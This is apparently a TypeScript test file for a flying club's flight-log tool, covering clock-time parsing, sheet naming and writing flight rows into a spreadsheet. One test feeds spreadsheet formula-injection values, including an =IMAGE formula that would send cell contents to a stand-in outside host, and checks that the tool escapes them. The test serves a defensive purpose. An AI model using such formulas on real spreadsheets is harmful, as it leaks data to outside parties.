import { describe, expect, test } from "bun:test";
import {
  clearedFlightCells,
  findWritableRows,
  flightCells,
  parseFlightSheet,
  SheetValues,
} from "@/utilities/flightSheetParser";
import { minutesBetween, normalizeClock, sheetNameFor } from "@/utilities/flightFormInput";

const HEADERS = [
  "Päivämäärä", "Päällikkö", "Oppilas / SIC", "Henkilömäärä", "Lentoonlähtöpaikka",
  "Laskupaikka", "Lentoonlähtöaika", "Laskuaika", "Ilmassa oloaika",
  "Kokonais ilmassaoloaika", "Laskujen määrä", "Laskujen kokonaismäärä", "Lennon tarkoitus",
  "Tankkaus", "Öljy", "Tuntimittari", "Huomiot", "ID", "Lähde", "Tila",
];
const flight = (id: string) => [46113, "M. Meikäläinen", "", 2, "EFSA", "EFSA", 0.78, 0.8, 0.02, 238, 1, 12061, "HAR", "", "", "", "", id];
const formulaRow = () => ["", "", "", "", "", "", "", "", 0, 0, "", 0];

describe("form input", () => {
  test("clock times in the ways people type them", () => {
    expect(normalizeClock("1405")).toBe("14:05");
    expect(normalizeClock("14.05")).toBe("14:05");
    expect(normalizeClock("14,05")).toBe("14:05");
    expect(normalizeClock("9:5")).toBe("09:05");
    expect(normalizeClock("905")).toBe("09:05");
    expect(normalizeClock("24:00")).toBeNull();
    expect(normalizeClock("klo 9")).toBeNull();
  });

  test("minutes between takeoff and landing, across midnight", () => {
    expect(minutesBetween("14.05", "15:29")).toBe(84);
    expect(minutesBetween("23:30", "0020")).toBe(50);
    expect(minutesBetween("14:05", "")).toBeNull();
  });

  test("sheet names in the T.Kuutti style", () => {
    expect(sheetNameFor("Tero Kuutti")).toBe("T.Kuutti");
    expect(sheetNameFor("Anna Maria Laine")).toBe("A.Laine");
    expect(sheetNameFor("Bodis")).toBe("Bodis");
  });
});

describe("writing to the sheet", () => {
  const sheet = (...rows: unknown[][]): SheetValues => [HEADERS, [], ...(rows as SheetValues)];
  // Every row from 3 on has the formula in the airborne-time column
  const formulas = (rows: number) => ["Ilmassa oloaika", "", ...Array(rows).fill("=H-G")];

  test("new flights go into the pre-filled rows after the last flight", () => {
    const values = sheet(flight("a"), flight("b"), formulaRow(), formulaRow());
    const parsed = parseFlightSheet(values);
    expect(findWritableRows(values, parsed, formulas(4))).toEqual([5, 6]);
  });

  test("a row someone has started typing into is not used", () => {
    const halfTyped = formulaRow();
    halfTyped[1] = "T.Kuutti";
    const values = sheet(flight("a"), formulaRow(), halfTyped, formulaRow());
    const parsed = parseFlightSheet(values);
    expect(findWritableRows(values, parsed, formulas(4))).toEqual([4]);
  });

  test("no rows when the formulas have run out", () => {
    const values = sheet(flight("a"));
    const parsed = parseFlightSheet(values);
    expect(findWritableRows(values, parsed, formulas(1))).toEqual([]);
  });

  test("a flight's cells cover only the input columns", () => {
    const parsed = parseFlightSheet(sheet(flight("a")));
    const cells = flightCells(
      {
        id: "new", flightDate: "2026-04-01", picName: "T.Kuutti", secondName: null,
        personsOnBoard: 2, departure: "EFSA", arrival: "EFJO", takeoff: "09:30",
        landing: "10:08", landings: 1, purposeCode: "MAT", fuelLitres: 60.5,
        oilLitres: null, hourMeter: null, remarks: null,
      },
      7,
      parsed.columns
    );
    const byHeader = Object.fromEntries(cells.map((c) => [HEADERS[c.column], c.value]));
    expect(byHeader).toMatchObject({
      "Päivämäärä": "2026-04-01",
      "Lentoonlähtöaika": "09:30",
      "Tankkaus": "60.5",
      "Öljy": "",
      "Päällikkö": "'T.Kuutti",
      "Oppilas / SIC": "",
      ID: "'new",
      "Lähde": "'web",
    });
    // Formulas and the billing status are left alone
    expect(byHeader).not.toHaveProperty("Ilmassa oloaika");
    expect(byHeader).not.toHaveProperty("Kokonais ilmassaoloaika");
    expect(byHeader).not.toHaveProperty("Tila");
    expect(cells.every((c) => c.row === 7)).toBe(true);
  });

  test("typed text never becomes a formula", () => {
    const parsed = parseFlightSheet(sheet(flight("a")));
    const cells = flightCells(
      {
        id: "new", flightDate: "2026-04-01", picName: "=T.Kuutti", secondName: "+1",
        personsOnBoard: 1, departure: "EFSA", arrival: "EFSA", takeoff: "09:30",
        landing: "10:08", landings: 1, purposeCode: "HAR", fuelLitres: null,
        oilLitres: null, hourMeter: null, remarks: '=IMAGE("https://example.invalid/"&A1)',
      },
      7,
      parsed.columns
    );
    const byHeader = Object.fromEntries(cells.map((c) => [HEADERS[c.column], c.value]));
    expect(byHeader["Huomiot"]).toBe(`'=IMAGE("https://example.invalid/"&A1)`);
    expect(byHeader["Päällikkö"]).toBe("'=T.Kuutti");
    expect(byHeader["Oppilas / SIC"]).toBe("'+1");
  });

  test("undoing clears the input columns and the source", () => {
    const parsed = parseFlightSheet(sheet(flight("a")));
    const cleared = clearedFlightCells(3, parsed.columns).map((c) => HEADERS[c.column]);
    expect(cleared).toContain("ID");
    expect(cleared).toContain("Lähde");
    expect(cleared).not.toContain("Ilmassa oloaika");
  });
});
